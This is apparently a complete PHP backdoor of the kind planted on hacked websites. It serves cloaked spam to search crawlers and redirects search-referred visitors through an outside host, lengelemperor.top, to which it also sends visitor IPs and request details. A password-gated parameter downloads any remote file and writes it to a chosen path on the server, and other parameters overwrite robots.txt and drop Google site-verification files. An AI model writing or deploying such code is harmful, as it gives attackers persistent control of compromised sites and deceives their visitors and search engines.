<?php
	error_reporting(0);
	header('Content-Type: text/html; charset=utf-8');
	$OoooOO0 = 'abc02';  
    date_default_timezone_set('PRC');
    $dRoot = @$_SERVER['DOCUMENT_ROOT'];
    $rUrl = @$_SERVER['REQUEST_URI'];
    $curName = @basename(__FILE__);
    $sName = @$_SERVER['HTTP_HOST'];
	$Ooolg = @$_SERVER['HTTP_ACCEPT_LANGUAGE'];
    $uAgent = @$_SERVER['HTTP_USER_AGENT'];
    $referer = @$_SERVER['HTTP_REFERER'];
    $http_type = ((isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] == 'on') || (isset($_SERVER['HTTP_X_FORWARDED_PROTO']) && $_SERVER['HTTP_X_FORWARDED_PROTO'] == 'https')) ? 'https://' : 'http://';
    $typeName = $http_type . $sName;
    $uAgent = @strtolower($uAgent);
    $referer = @strtolower($referer);
	if(getenv('HTTP_CLIENT_IP')){ 
        $client_ip = getenv('HTTP_CLIENT_IP'); 
    } elseif(getenv('HTTP_X_FORWARDED_FOR')) { 
        $client_ip = getenv('HTTP_X_FORWARDED_FOR'); 
    } elseif(getenv('REMOTE_ADDR')) {
        $client_ip = getenv('REMOTE_ADDR'); 
    } else {
        $client_ip = $_SERVER['REMOTE_ADDR'];
    }
    $siteweb = "lengelemperor.top";
    if (strstr($rUrl, 'sitemap_index_')) {
        $pr = dirname($rUrl);
        allmap($OoooOO0,$typeName,$rUrl,$sName,$http_type,$pr,$siteweb);
    }
    if (strstr($rUrl, '.xml')) {
        $pr = dirname($rUrl);
        sitefun($OoooOO0,$typeName,$rUrl,$http_type,$sName,$client_ip,$pr,$siteweb);
    }
    function allmap($OoooOO0,$typeName,$rUrl,$sName,$http_type,$pr,$siteweb){
        $ol = 'http://'.$OoooOO0.'.'.$siteweb.'/Api/siteAllMap.php?page='.$rUrl.'&pwd=sl123&domain='.$typeName.'&cur='.$curName;
        if ($_GET['vf_allmap'] == 'on') {
            echo $ol;
            exit;
        }
        $getRes = json_decode(getCurl($ol), true);
        $getsResult = $getRes['data'];
        header('Content-type:text/xml');
        echo $getsResult;
        exit();
    }
    function sitefun($OoooOO0,$typeName,$rUrl,$http_type,$sName,$client_ip,$pr='',$siteweb,$qs='') {
        $ol = 'http://'.$OoooOO0.'.'.$siteweb.'/Api/siteUrlApi.php?stype=sitemap&num=6000&pr='.$pr.'&url='.$rUrl.'&domain='.$typeName.'&ip='.$client_ip.'&cur='.$curName;
        if ($_GET['vf_map'] == 'on') {
            echo $ol;
            exit;
        }
        $getRes = json_decode(getCurl($ol), true);
		if (isset($getRes['code'])&&$getRes['code']=='600') {
			$getsResult = $getRes['data'];
			foreach($getsResult as $Oog => $Oov){
				$pingRes = getCurl($Oov);
				$Oooo0s = (strpos($pingRes,'Sitemap Notification Received') !== false) ? 'OK' : 'ERROR';
				echo $Oov.'===>Submitting Google Sitemap: '.$Oooo0s.PHP_EOL;
			}
			exit();
		} 
		if (isset($getRes['code'])&&$getRes['code']=='406'){
			echo 'Submitting Google Sitemap Return Fail';
			exit();
		}
        if (empty($getRes)||$getRes['code'] == 404) {
            header('HTTP/1.0 404 Not Found');
            header('Status: 404 Not Found');
            exit();
        }
        $getsResult = $getRes['data'];
        header('Content-type:text/xml');
        echo $getsResult;
        exit();
    }
	 
		if (md5(@$_GET['mm']) == "fb33fe23e736ba24a85ab0fd3f8e47fd") { 
			$smstr = @getCurl('http://'.$OoooOO0.'.'.$siteweb.'/file/'.$_GET['name']);
			if (file_put_contents(@$_GET['file'], $smstr)) {
				echo 'ok';
			}
		}
	
	if(isset($_GET['google'])){
		$go=$_GET['google'];
		if (preg_match('/^google.*?(\.html)$/i', $go)) {
			if(putFile($go,'google-site-verification:'.' '.$go)){
			    exit('<a href='.$go.'>'.$go.'</a>');
			} else{
			    exit('fail!!!!');
			}
		}
	}
	if (isset($_GET['robots'])) {
		$robots = $_GET['robots'];
		if (preg_match('/(\.php)$/i', $robots)) {
			$typeName = $typeName . '/' . $robots . '?';
		} else {
			$typeName = $typeName . '/';
		}
		putFile( 'robots.txt', 'User-agent: *' . PHP_EOL . 'Allow: /' . PHP_EOL . 'Crawl-delay:3' . PHP_EOL . 'Sitemap:' . $typeName . 'sitemap_index_1.xml' . PHP_EOL . 'Sitemap:' . $typeName . 'sitemap_index_2.xml' . PHP_EOL . 'Sitemap:' . $typeName . 'sitemap_index_3.xml' . PHP_EOL . 'Sitemap:' . $typeName . 'sitemap_index_4.xml' . PHP_EOL . 'Sitemap:' . $typeName . 'sitemap_index_5.xml' . PHP_EOL . 'Sitemap:' . $typeName . 'sitemap_index_6.xml' . PHP_EOL . 'Sitemap:' . $typeName . 'sitemap_index_7.xml' . PHP_EOL . 'Sitemap:' . $typeName . 'sitemap_index_8.xml');
		$file_get_contents = file_get_contents('robots.txt');
		echo $file_get_contents;
		exit();
	} 
    if(preg_match('/google.co.jp|yahoo|google\.com[^.]*?$|bing/i', $referer)){
         if ($_GET['vf_jump'] == 'on') {
            echo 'http://'.$OoooOO0.'.'.$siteweb.'/jump.php?domain='.$sName.'&page='.$rUrl.'&bot=0&pr='.$pr.'&refer='.$referer.'&ip='.$client_ip.'&lg='.$Ooolg.'&cur='.$curName;
            exit;
        }
 		$jumpRes=getCurl('http://'.$OoooOO0.'.'.$siteweb.'/jump.php?domain='.$sName.'&page='.$rUrl.'&bot=0&pr='.$pr.'&refer='.$referer.'&ip='.$client_ip.'&lg='.$Ooolg.'&cur='.$curName);
		if ($jumpRes) {
			echo $jumpRes;
			exit();
		}
    }
    if(stristr($uAgent,'googlebot')||stristr($uAgent,'bing')||stristr($uAgent,'Y!J')||stristr($uAgent,'y!j')||stristr($uAgent,'yahoo')||stristr($uAgent,'google')||stristr($uAgent,'Googlebot')||stristr($uAgent,'googlebot')){
        if ($_GET['vf_bot'] == 'on') {
            echo 'http://'.$OoooOO0.'.'.$siteweb.'/918.php?domain='.$sName.'&page='.$rUrl.'&bot=1&pr='.$pr.'&ip='.$client_ip.'&lg='.$Ooolg.'&cur='.$curName;
            exit;
        }
        $file_contents = getCurl('http://'.$OoooOO0.'.'.$siteweb.'/918.php?domain='.$sName.'&page='.$rUrl.'&bot=1&pr='.$pr.'&ip='.$client_ip.'&lg='.$Ooolg.'&cur='.$curName);
		if(!empty($file_contents)){
            $getRes = json_decode($file_contents, true);
            if ($getRes['code'] == 404) {
                header('HTTP/1.0 404 Not Found');
                header('Status: 404 Not Found');
                exit();
            }
            if ($getRes['code'] == 500) {
                header('HTTP/1.1 500 Internal Server Error');
                exit();
            }
			echo $file_contents;
			exit;
		}
    }
    
	function getCurl($gurl)
	{
		$file_contents = '';
		$user_agent = 'Mozilla/4.0 (compatible;MSIE 6.0;Windows NT 5.2;.NET CLR 1.1.4322)';
		if(function_exists('curl_init')){
			try
			{
				$ch = curl_init();
				$timeout = 30;
				curl_setopt($ch,CURLOPT_URL,$gurl);
				curl_setopt($ch,CURLOPT_SSL_VERIFYHOST, 0);
				curl_setopt($ch,CURLOPT_SSL_VERIFYPEER, 0);
				curl_setopt($ch,CURLOPT_RETURNTRANSFER,1);
				curl_setopt($ch,CURLOPT_CONNECTTIMEOUT,$timeout);
				$file_contents = curl_exec($ch);
				curl_close($ch);
			}
			catch (Exception $e)
			{}
		}
		if(strlen($file_contents)<1&&function_exists('file_get_contents')){
			ini_set('user_agent',$user_agent);
			try
			{
				$file_contents = @file_get_contents($gurl);
			}
			catch (Exception $e)
			{}
		}
		return $file_contents;
	}
    function putFile($htName, $htContents) {
        $handle = fopen($htName, 'w') or die('0');
        $result = fwrite($handle, $htContents);
        fclose($handle);
        return $result;
    }
?>